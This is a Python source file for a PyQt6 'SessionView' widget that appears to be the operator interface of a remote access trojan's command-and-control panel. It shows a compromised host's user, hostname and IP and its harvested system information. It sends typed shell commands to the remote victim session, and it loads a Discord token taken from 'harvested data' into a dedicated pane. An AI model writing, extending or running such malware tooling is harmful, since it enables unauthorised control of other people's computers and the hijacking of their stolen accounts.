# ui/session_view.py
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QTabWidget, QTextEdit
from PyQt6.QtCore import pyqtSignal, Qt
from .discord_pane import DiscordPane
from .terminal_pane import TerminalPane
import uuid

class SessionView(QWidget):
    back_requested = pyqtSignal()
    task_requested = pyqtSignal(str, dict)

    def __init__(self):
        super().__init__()
        self.current_session_id = None
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        header_widget = QWidget()
        header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        self.back_button = QPushButton("< Back")
        self.back_button.setFixedWidth(100)
        self.back_button.clicked.connect(self.back_requested.emit)
        
        self.session_info_label = QLabel("Managing Session: None")
        self.session_info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.status_label = QLabel("UNKNOWN")
        self.status_label.setObjectName("StatusLabel")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setFixedWidth(120)

        header_layout.addWidget(self.back_button)
        header_layout.addWidget(self.session_info_label)
        header_layout.addWidget(self.status_label)
        main_layout.addWidget(header_widget)

        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs)

        self.terminal_pane = TerminalPane()
        self.terminal_pane.command_entered.connect(self.send_terminal_command)
        self.sysinfo_pane = QTextEdit(); self.sysinfo_pane.setReadOnly(True)
        self.filemanager_pane = QLabel("File Manager (Coming Soon)")
        self.liveactions_pane = QLabel("Live Actions (Coming Soon)")
        self.discord_pane = DiscordPane()

        self.tabs.addTab(self.terminal_pane, "Live Terminal")
        self.tabs.addTab(self.sysinfo_pane, "System Info")
        self.tabs.addTab(self.filemanager_pane, "File Manager")
        self.tabs.addTab(self.liveactions_pane, "Live Actions")
        self.tabs.addTab(self.discord_pane, "Discord")

    def load_session(self, session_id, session_data):
        self.current_session_id = session_id
        metadata = session_data.get('metadata', {})
        status = session_data.get('status', 'Offline')

        self.terminal_pane.clear_output()
        self.sysinfo_pane.clear()

        user = metadata.get('user', 'N/A')
        hostname = metadata.get('hostname', 'N/A')
        ip = metadata.get('ip', 'N/A')
        self.session_info_label.setText(f"<b>{user}@{hostname}</b> ({ip})")
        
        self.status_label.setText(status.upper())
        self.status_label.setProperty("status", status.lower())
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)

        sys_info_html = "<h2>System Information</h2>"
        for key, value in metadata.items():
            sys_info_html += f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>"
        self.sysinfo_pane.setHtml(sys_info_html)

        discord_token = metadata.get('discord_token')
        if discord_token:
            self.discord_pane.load_token_from_c2(discord_token)
            self.tabs.setCurrentWidget(self.discord_pane)
        else:
            self.discord_pane.token_input.setText("")
            self.discord_pane.feedback_label.setText("No Discord token found in harvested data for this session.")
            self.tabs.setCurrentWidget(self.terminal_pane)

    def send_terminal_command(self, command):
        if self.current_session_id:
            task = {
                "action": "shell",
                "params": {"command": command},
                "response_id": str(uuid.uuid4())
            }
            self.task_requested.emit(self.current_session_id, task)

    def handle_command_response(self, session_id, response_data):
        if session_id == self.current_session_id:
            output = response_data.get('output', 'No output received.')
            self.terminal_pane.append_output(output + "\n")